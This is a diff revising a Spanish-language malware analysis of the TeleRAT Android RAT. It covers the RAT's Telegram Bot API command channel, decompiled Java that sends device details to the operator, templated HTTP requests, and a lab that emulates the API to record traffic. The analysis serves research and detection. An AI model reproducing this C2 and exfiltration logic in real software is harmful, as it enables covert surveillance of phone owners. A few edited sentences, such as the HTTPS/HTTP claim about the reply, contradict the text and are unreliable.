@@ -2,13 +2,11 @@ La referencia pública de [Unit 42 sobre TeleRAT](https://unit42.paloaltonetwork
 
 Este comportamiento encaja directamente con **T1481.002 - Web Service: Bidirectional Communication**. La [definición de MITRE ATT&CK](https://attack.mitre.org/techniques/T1481/002/) contempla el uso de un servicio web legítimo para enviar órdenes al sistema comprometido y recibir por ese mismo servicio el resultado de su ejecución. TeleRAT satisface ambas partes mediante `api.telegram.org`: consulta los mensajes pendientes con `getUpdates` y publica las respuestas mediante métodos como `sendMessage`, `sendDocument` o `sendPhoto`.
 
-La comunicación de entrada no es una conexión iniciada desde Telegram hacia el terminal. Es la propia víctima la que consulta periódicamente la API. Por ello, en una captura realizada en el dispositivo, la orden aparece dentro de la respuesta de Telegram a una petición saliente `getUpdates`. Tras ejecutar la orden, el terminal abre otra petición contra el mismo servicio para publicar el resultado.
+La propia víctima es la que consulta periódicamente la API. La orden correspondiente al "protocolo" C&C aplicado aquí aparece dentro de la respuesta de Telegram a una petición saliente `getUpdates`. Tras ejecutar la orden, el terminal abre otra petición contra el mismo servicio para publicar el resultado.
 
-En Telegram, un bot es una cuenta automatizada que se controla mediante peticiones a la API. El token es la credencial que identifica y autoriza el acceso a esa cuenta, mientras que el identificador de conversación, denominado `chat_id` por Telegram, señala la conversación concreta en la que se publican los mensajes. TeleRAT lleva ambos valores incrustados en el código, por lo que el terminal infectado y el operador utilizan la misma cuenta de bot y la misma conversación como canal compartido.
+En Telegram, un bot es una cuenta automatizada que se controla mediante peticiones a la API. El token es la credencial que identifica y autoriza el acceso a esa cuenta, mientras que el identificador de conversación, denominado `chat_id` por Telegram, señala la conversación concreta en la que se publican los mensajes. La muestra de TeleRAT estudiada lleva ambos valores incrustados en el código.
 
-La muestra tampoco realiza un registro de víctima convencional. No negocia un identificador propio con un panel ni recibe una configuración nueva. La asociación con el C2 consiste en utilizar esos valores ya incorporados a la aplicación. El modelo del dispositivo y `android_id` se añaden posteriormente al texto de algunas respuestas para que el operador pueda distinguir terminales.
-
-El análisis se apoya en la APK abierta en JADX:
+El análisis se apoya en la APK:  
 
 | Artefacto estudiado | Identidad | SHA-256 |
 |---|---|---|
@@ -16,7 +14,7 @@ El análisis se apoya en la APK abierta en JADX:
 
 ### Estructura del canal Telegram
 
-Los parámetros relevantes del canal pueden representarse sin reproducir credenciales reales:
+Los parámetros relevantes del canal se pueden resumir de la siguiente forma:
 
 | Parámetro | Origen en la muestra | Uso en red |
 | --- | --- | --- |
@@ -51,9 +49,9 @@ Content-Length: 4
 amir
 ```
 
-El cuerpo no contiene un formulario válido ni parámetros de la API. Es literalmente la cadena `amir`, que no tiene un significado reconocido por Telegram ni transporta información de la víctima. Es un valor fijo elegido por el autor y Telegram puede ignorarlo porque `getUpdates` no necesita parámetros obligatorios.
+El cuerpo contiene literalmente la cadena `amir`, la cual no tiene un significado reconocido por Telegram ni transporta información de la víctima, es un valor fijo elegido por el autor. Es posible que sea atribuible a un artefacto usado en pruebas que no ha sido eliminado del malware en producción.
 
-La respuesta de Telegram es JSON. Para el comando elegido en este análisis, **`دریافت وضعیت`**, cuya función es solicitar el estado del terminal, el contenido lógico necesario es:
+La respuesta de Telegram es JSON. Un ejemplo para el comando,**`دریافت وضعیت`**, cuya función es solicitar el estado del terminal, es:
 
 ```http
 HTTP/1.1 200 OK
@@ -62,20 +60,20 @@ Content-Type: application/json
 {"ok":true,"result":[{"update_id":<UPDATE_ID>,"message":{"message_id":<MESSAGE_ID>,"from":{"id":<OPERATOR_USER_ID>,"is_bot":false,"first_name":"<OPERATOR_FIRST_NAME>","username":"<OPERATOR_USERNAME>"},"chat":{"id":<CHAT_ID>,"type":"private"},"date":<UNIX_TIME>,"text":"دریافت وضعیت"}}]}
 ```
 
-La ausencia de espacios alrededor de los separadores no es meramente estética. El analizador busca literales como `'text':'`, `'username':'` y `'first_name':'` después de sustituir las comillas dobles. El futuro servidor de laboratorio debe emitir el JSON en esta forma compacta para reproducir la respuesta que el código sabe consumir.
+La ausencia de espacios alrededor de los separadores no es meramente estética. El analizador busca literales como `'text':'`, `'username':'` y `'first_name':'` después de sustituir las comillas dobles. El futuro servidor de laboratorio debe emitir el JSON en esta forma compacta.
 
-El canal de salida, por el que el malware devuelve la respuesta a la orden recibida, utiliza el método `sendMessage`. En esta rama concreta, la muestra no emplea la misma función auxiliar que recibe las órdenes. El método `botrat._send_message()` construye una URL con esquema `http` y `httpjob._download2()` la convierte en una petición `GET`:
+El canal de salida, por el que el malware devuelve la respuesta a la orden recibida, utiliza el método `sendMessage`. El método `botrat._send_message()` construye una URL con esquema `http` y `httpjob._download2()` la convierte en una petición `GET`:
 
 ```http
 GET /bot<BOT_TOKEN>/sendmessage?chat_id=<CHAT_ID>&text=<STATUS_TEXT_URL_ENCODED> HTTP/1.1
 Host: api.telegram.org
 ```
 
-La primera petición producida por el código para esta respuesta sale por HTTP en claro hacia el puerto TCP `80`. La muestra utiliza la biblioteca HTTP de Apache y, concretamente, su cliente `DefaultHttpClient` para enviar las peticiones construidas por sus funciones auxiliares. Esta biblioteca añade automáticamente determinados encabezados de transporte. Dichos encabezados, así como las direcciones IP, los puertos efímeros, la versión TLS y el conjunto criptográfico negociado, no están fijados por el código malicioso. Sí están fijados el nombre `api.telegram.org`, los esquemas `https` y `http`, los métodos, las rutas, el tipo de contenido de las peticiones `POST` y los cuerpos creados por la aplicación. El uso de HTTP en claro para devolver el resultado impide reproducir esta rama contra la infraestructura pública, pues la [API de Telegram exige HTTPS](https://core.telegram.org/bots/api). Por tanto, una captura fiel de la APK requiere emular localmente la API, como hace el laboratorio en Python.
+La primera petición producida por el código para esta respuesta sale por HTTP en claro hacia el puerto TCP `80`. Es decir, la petición usa HTTPS, mientras que la respuesta viaja en crudo a través del protocolo HTTP. La muestra utiliza la biblioteca HTTP de Apache y, concretamente, su cliente `DefaultHttpClient` para enviar las peticiones construidas por sus funciones auxiliares. Esta biblioteca añade automáticamente determinados encabezados de transporte. Dichos encabezados, así como las direcciones IP, los puertos efímeros, la versión TLS y el conjunto criptográfico negociado, no están fijados por el código malicioso. Sí están fijados el nombre `api.telegram.org`, los esquemas `https` y `http`, los métodos, las rutas, el tipo de contenido de las peticiones `POST` y los cuerpos creados por la aplicación. El uso de HTTP en claro para devolver el resultado impide reproducir esta rama contra la infraestructura pública, pues la [API actual de Telegram exige HTTPS](https://core.telegram.org/bots/api). Por tanto, una captura fiel de la APK requiere emular localmente la API.
 
 ### Inicio de los servicios y comunicaciones iniciales
 
-El punto de entrada `b4a.examplf.main._activity_create()` inicia los servicios `teleser` y `botrat`, además de otros componentes que no intervienen en este flujo:
+El punto de entrada `b4a.examplf.main._activity_create()` inicia los servicios `teleser` y `botrat`, además de otros componentes que no intervienen en el flujo que se va a estudiar y desarrollar.
 
 ```java
 public static String _activity_create(boolean z) throws Exception {
@@ -113,13 +111,13 @@ public static String _service_create() throws Exception {
 }
 ```
 
-La petición `getUpdates` se programa cada `3,1` segundos; los `4,6` segundos corresponden al temporizador que entrega la orden al ejecutor. Al ser temporizadores independientes, el tiempo exacto entre la respuesta de Telegram y la ejecución depende de la fase en la que se encuentre cada uno.
+La petición `getUpdates` se programa cada `3,1` segundos; los `4,6` segundos corresponden al temporizador que entrega la orden. Al ser temporizadores independientes, el tiempo exacto entre la respuesta de Telegram y la ejecución depende de la fase en la que se encuentre cada uno.
 
-El primer arranque no contiene una petición de registro que negocie la identidad de la víctima con el C2. El token del bot y el `chat_id` ya están incrustados en la aplicación. Sí contiene dos mensajes iniciales que informan al operador y preparan la conversación de Telegram. La muestra utiliza los ficheros vacíos `telerat2.txt` y `thisapk_slm.txt` como marcadores locales para enviar cada uno de esos mensajes una sola vez.
+El primer arranque no contiene una petición de registro debido a que el token del bot y el `chat_id` ya están incrustados en la aplicación. Sí contiene dos mensajes iniciales que informan al operador y preparan la conversación de Telegram. La muestra utiliza los ficheros vacíos `telerat2.txt` y `thisapk_slm.txt` como marcadores locales para enviar cada uno de esos mensajes una sola vez.
 
 #### Informe de instalación
 
-El denominado informe de instalación no es un fichero ni una carga adjunta. Es un mensaje de texto que comunica que un nuevo dispositivo ha instalado la aplicación y enumera información del terminal. La clase `botrat`, dentro de `_service_create()`, comprueba primero si existe `telerat2.txt`. Cuando no existe, crea el marcador antes de construir y enviar el mensaje:
+El primer fichero de los dos comentados anteriormente tiene como objetivo comunicar que un nuevo dispositivo ha instalado la aplicación y enumerar información de dicho terminal. La clase `botrat`, dentro de `_service_create()`, comprueba primero si existe `telerat2.txt`. Cuando no existe, crea el documento antes de construir y enviar el mensaje:
 
 ```java
 if (!File.Exists(File.getDirInternal(), "telerat2.txt")) {
@@ -133,7 +131,7 @@ if (!File.Exists(File.getDirInternal(), "telerat2.txt")) {
 }
 ```
 
-El contenido lógico del informe, antes de codificarlo para introducirlo en la URL, es el siguiente:
+El contenido lógico del informe, antes de ser codificado es el siguiente:
 
 ```text
 تهیه شده توسط  وحید میل شصتو هفت @vahidmail67 ♡دستگاه جدیدی برنامه را نصب کرد✅
@@ -154,7 +152,7 @@ El contenido lógico del informe, antes de codificarlo para introducirlo en la U
 ساعت⏱<TIME>
 ```
 
-Los valores proceden, respectivamente, del modelo, la marca, la versión de Android, el identificador de compilación `DISPLAY`, el cargador de arranque, la capacidad total y disponible del almacenamiento interno y externo expresada como un número entero de MB, el número de núcleos, el nombre del operador móvil, `android_id`, la fecha persa y la hora local. Aunque la etiqueta persa indica «modelo completo del dispositivo», el código inserta realmente el valor del cargador de arranque mediante `getBootloader()`.
+Algunos de los valores son: el modelo, la marca, la versión de Android, el identificador de compilación `DISPLAY`, el cargador de arranque, y finalmente la capacidad total y disponible (entre otros).
 
 Antes de llamar a `_send_message2()`, el método `_service_create()` codifica el texto completo en UTF-8. El método `_send_message2()` coloca el resultado en el parámetro `text` de `sendMessage` y llama a `_poststring()` con una cadena vacía como segundo argumento:
 
@@ -167,7 +165,7 @@ httpjobVar._poststring(
 );
 ```
 
-La presencia de `chat_id` y `text` en la URI no convierte la petición en un `GET`. El método HTTP y la ubicación de los parámetros son cuestiones independientes. En este caso, `_poststring()` convierte la cadena vacía en un cuerpo de cero bytes; después, `_postbytes()` llama a `InitializePost2()`, que crea expresamente un objeto `HttpPost`. Por tanto, el método transmitido en la línea inicial es `POST`, los datos del informe viajan en la cadena de consulta de la URI y el cuerpo permanece vacío:
+La presencia de `chat_id` y `text` en la URI no convierte la petición en un `GET`. El método HTTP y la ubicación de los parámetros son cuestiones independientes. En este caso, `_poststring()` convierte la cadena vacía en un cuerpo de cero bytes; después, `_postbytes()` llama a `InitializePost2()`, que crea expresamente un objeto `HttpPost`. Por tanto, el método transmitido en el registro de datos inicial es `POST`, aunque los datos del informe viajan en la cadena de consulta de la URI y el cuerpo permanece vacío:
 
 ```http
 POST /bot<BOT_TOKEN>/sendmessage?chat_id=<CHAT_ID>&text=<INSTALL_REPORT_URL_ENCODED> HTTP/1.1
@@ -177,11 +175,11 @@ Content-Length: 0
 
 ```
 
-Telegram publica ese texto en la conversación identificada por `<CHAT_ID>` si la petición se completa correctamente. La clase `botrat` crea `telerat2.txt` antes de intentar enviarlo. En los siguientes arranques, la existencia del fichero hace que el código omita todo el bloque encargado de construir y mandar el informe. Por tanto, si la primera petición falla, la muestra no vuelve a intentarlo, ya que `telerat2.txt` permanece creado.
+En los siguientes arranques, la existencia del fichero hace que el código omita todo el bloque encargado de construir y mandar el informe. Por tanto, si la primera petición falla, la muestra no vuelve a intentarlo, ya que `telerat2.txt` permanece creado.
 
 #### Primer sondeo y envío del teclado de órdenes
 
-La clase `teleser` prepara durante su creación 23 textos de órdenes y los distribuye en un teclado de nueve filas. No lo envía todavía. El envío se produce cuando termina la primera petición `getUpdates` y se ejecuta `_tele_finish()`. Para que el PCAP represente un primer arranque sin una orden pendiente, el laboratorio responderá a ese primer sondeo con:
+La clase `teleser` prepara durante su creación 23 textos de órdenes y los distribuye en un teclado de nueve filas. Este es el formato que se visualizaría posteriormente en la aplicación real. El envío se produce cuando termina la primera petición `getUpdates` y se ejecuta `_tele_finish()`. El laboratorio responderá a ese primer sondeo con:
 
 ```http
 HTTP/1.1 200 OK
@@ -192,7 +190,7 @@ Content-Type: application/json
 
 La lista `result` vacía indica únicamente que Telegram no tiene todavía ninguna actualización que entregar. Esta primera petición realiza exactamente la misma función que los sondeos posteriores; la diferencia es que una respuesta posterior incluirá en `result` el mensaje con la orden del operador.
 
-Después de procesar esa respuesta, `_tele_finish()` comprueba `thisapk_slm.txt`. Si el fichero no existe, llama a `_send_messagewithbutton()` y crea seguidamente el marcador, sin esperar la respuesta de Telegram:
+Después de procesar esa respuesta, `_tele_finish()` comprueba `thisapk_slm.txt`. Si el fichero no existe, llama a `_send_messagewithbutton()` y crea seguidamente el documento, sin esperar la respuesta de Telegram:
 
 ```java
 if (!File.Exists(File.getDirInternal(), "thisapk_slm.txt")) {
@@ -224,7 +222,7 @@ El mensaje indica al operador que utilice las órdenes mostradas debajo. El terc
 }
 ```
 
-El campo `keyboard` define las filas y los textos de los botones. El campo `resize_keyboard` solicita a Telegram que ajuste el tamaño del teclado a su contenido. Al pulsar un botón, la aplicación de Telegram del operador envía a la conversación un mensaje cuyo texto coincide exactamente con el botón. TeleRAT recupera después ese texto mediante `getUpdates` y lo interpreta como una orden.
+El campo `keyboard` define las filas y los textos de los botones. El campo `resize_keyboard` solicita a Telegram que ajuste el tamaño del teclado a su contenido. Al pulsar un botón, la aplicación de Telegram del operador enviará a la conversación un mensaje cuyo texto coincide exactamente con uno de los botone. TeleRAT recupera después ese texto mediante `getUpdates` y lo interpreta como una orden.
 
 El método `_send_messagewithbutton()` usa HTTPS y construye una URL con tres parámetros de consulta. El parámetro `chat_id` recibe el identificador de la conversación. El parámetro `text` recibe el mensaje introductorio después de que `_encodeurl()` sustituya los espacios por `%20` y los saltos de línea por `%0A`. El parámetro `reply_markup` recibe el objeto JSON del teclado después de codificarlo para una URL mediante `URLEncoder.encode(..., "UTF8")`. De forma independiente, el segundo argumento de `_poststring()` establece la cadena literal `amir` como cuerpo del `POST`; la función la convierte en cuatro bytes UTF-8:
 
@@ -251,11 +249,9 @@ amir
 
 El marcador `<KEYBOARD_PROMPT_URL_ENCODED>` representa el texto persa mostrado en el código después de aplicar las sustituciones de `_encodeurl()`. El marcador `<KEYBOARD_JSON_URL_ENCODED>` representa el objeto JSON anterior transformado mediante la codificación de formulario para URL, utilizando UTF-8 para convertir sus caracteres en bytes antes de representarlos en la URI.
 
-Por tanto, los dos ficheros solo controlan la repetición de los mensajes iniciales. No habilitan el bot, no registran la víctima y no condicionan los sondeos posteriores.
-
 ### Sondeo y recepción de la orden
 
-Cada vencimiento de `t1` vuelve a inicializar el componente de acceso a Telegram:
+Cada vencimiento de`t1` vuelve a inicializar el componente de acceso a Telegram:
 
 ```java
 public static String _t1_tick() throws Exception {
@@ -281,7 +277,7 @@ public String _initialize(BA ba, String str, Object obj, String str2)
 }
 ```
 
-El método `httpjob._poststring()` codifica `amir` como cuatro bytes UTF-8 y llama a `InitializePost2()`. La biblioteca fija el tipo del cuerpo:
+El método `httpjob._poststring()` codifica `amir` y llama a `InitializePost2()`. La biblioteca fija el tipo del cuerpo:
 
 ```java
 public String _poststring(String str, String str2) throws Exception {
@@ -300,7 +296,7 @@ public void InitializePost2(String str, byte[] bArr) {
 }
 ```
 
-Cuando llega la respuesta, el método `tp_getupdate._jobdone()` comprueba que el trabajo se llame `get`. Este nombre es solo la etiqueta interna que la muestra asigna a la petición para reconocer su resultado; no es otro método de Telegram. A continuación, sustituye comillas dobles por simples, divide el texto usando `update_id` y llama a `_show_message()`:
+Cuando llega la respuesta, el método `tp_getupdate._jobdone()` comprueba que el "job name" sea `get`. A continuación, sustituye comillas dobles por simples, divide el texto usando `update_id` y llama a `_show_message()`:
 
 ```java
 if (httpjobVar._jobname.equals("get")) {
@@ -314,7 +310,7 @@ if (httpjobVar._jobname.equals("get")) {
 }
 ```
 
-El analizador no usa un tratamiento JSON robusto para las órdenes. Localiza la última aparición de `'text':'` en cada fragmento y conserva el texto situado a continuación:
+El analizador no usa un tratamiento JSON robusto para las órdenes. De hecho es bastante "manual". Localiza la última aparición de `'text':'` en cada fragmento y conserva el texto situado a continuación:
 
 ```java
 String strObjectToString = BA.ObjectToString(this._getupdate.Get(i));
@@ -328,9 +324,7 @@ this._user_messages.Add(this._str5);
 
 La muestra también intenta extraer `username`, `first_name`, `id`, `message_id` y `date`. Existe un error de índice en la extracción final de la fecha, pero la excepción se captura y el componente invoca igualmente `tele_Finish`. Por tanto, ese defecto no impide que el texto de la orden ya añadido a `_user_messages` llegue al servicio `teleser`.
 
-No hay una comprobación que limite las órdenes al `chat_id` incrustado, a un identificador de usuario concreto o a un nombre de operador. Cualquier mensaje devuelto por `getUpdates` puede alimentar el ejecutor. Para una captura controlada, el servidor debe devolver una única actualización nueva y colocar `دریافت وضعیت` en `message.text`.
-
-### Entrega interna al ejecutor
+### Entrega interna
 
 El final de la consulta copia los mensajes recuperados a `_l1`:
 
@@ -381,9 +375,11 @@ Para el flujo propuesto, `_field1` contiene exactamente:
 دریافت وضعیت
 ```
 
+El cual es un comando muy simple, que solo se usa para ejemplificar la técnica T1481.002 en el canal C&C.
+
 ### Ejecución de `دریافت وضعیت` y retorno por Telegram
 
-La rama seleccionada se encuentra en `b4a.examplf.botrat._do_it()`. Construye un mensaje de estado con la fecha y la hora locales y lo pasa a `_send_message()`:
+EL comando seleccionado se encuentra en `b4a.examplf.botrat._do_it()`. Construye un mensaje de estado con la fecha y la hora locales y lo pasa a `_send_message()`:
 
 ```java
 if (str.equals("دریافت وضعیت")) {
@@ -531,7 +527,7 @@ sequenceDiagram
 
 ### Laboratorio de generación del PCAP
 
-El laboratorio ejecuta la muestra original de TeleRAT en el AVD AOSP `golden_api21_aosp`, basado en Android 5.0/API 21. Esta versión es necesaria porque la APK distribuye código entre `classes.dex` y `classes2.dex`; Android 4.4/API 19 intenta inicializar `com.applisto.appcloner.classes.DefaultProvider` antes de cargar el segundo DEX y la aplicación termina durante el arranque. Android Emulator permanece en Windows y Kali WSL aloja las entidades controladas.
+El laboratorio ejecuta la muestra original de TeleRAT en un AVD de Android Studio AOSP basado en Android 5.0/API 21. Esta versión es necesaria porque la APK distribuye código entre `classes.dex` y `classes2.dex`; Android 4.4/API 19 intenta inicializar `com.applisto.appcloner.classes.DefaultProvider` antes de cargar el segundo DEX y la aplicación termina durante el arranque. Android Emulator permanece en Windows y Kali WSL aloja las entidades controladas.
 
 | Entidad | Dirección y servicio | Procedencia |
 |---|---|---|
@@ -539,8 +535,7 @@ El laboratorio ejecuta la muestra original de TeleRAT en el AVD AOSP `golden_api
 | API de Telegram emulada | `149.154.167.220:80` y `149.154.167.220:443` | Dirección incluida en el prefijo `149.154.160.0/20` publicado por [Telegram](https://core.telegram.org/resources/cidr.txt). Representa el servicio legítimo abusado por TeleRAT, no infraestructura dedicada a la familia. |
 | Operador | `10.230.70.20:9000` | Dirección privada desde la que se proporciona a la API emulada la orden destinada a la muestra. No es un IOC ni se anuncia al dispositivo. |
 
-El AVD confía previamente en la autoridad `TeleRAT Lab CA`. El certificado presentado para `api.telegram.org` contiene ese nombre en su SAN y está firmado por dicha autoridad. El servidor conserva TLS 1.0 y `TLS_RSA_WITH_AES_128_CBC_SHA`, de acuerdo con la ejecución observada; la clave privada RSA y los certificados quedan inventariados junto al PCAP para permitir el descifrado. Esta preparación pertenece al estado previo de la máquina virtual y no se repite durante la captura.
+El AVD carece de una cadena de certificación para telegram al ser descargado, por lo tanto se le debe suministrar un certificado X.509. El certificado presentado para `api.telegram.org` contiene ese nombre en su SAN y está firmado por dicha autoridad. El servidor conserva TLS 1.0 y `TLS_RSA_WITH_AES_128_CBC_SHA`, de acuerdo con la ejecución observada; la clave privada RSA y los certificados quedan inventariados junto al PCAP para permitir el descifrado. 
 
-TeleRAT deshabilita su componente lanzador después de ocultar la actividad, por lo que una repetición debe restaurar `b4a.examplf/.main` antes de abrir la aplicación. El operador emulado introduce `دریافت وضعیت` después de recibir el mensaje que contiene el teclado de órdenes; la muestra obtiene la orden mediante `getUpdates` y devuelve el resultado mediante el mismo servicio.
+TeleRAT deshabilita su componente lanzador después de ocultar la actividad, por lo que una repetición debe restaurar `b4a.examplf/.main` (lo que equivale a desinstalar e instalar "a mano") antes de abrir la aplicación de nuevo. 
 
-Este escenario está incorporado en `python-labnet` con el identificador `telerat`. La preparación de la topología, el arranque manual del AVD, la captura interactiva y la retirada del entorno se describen en la [guía central de laboratorios Android](Laboratorios%20Android.md).
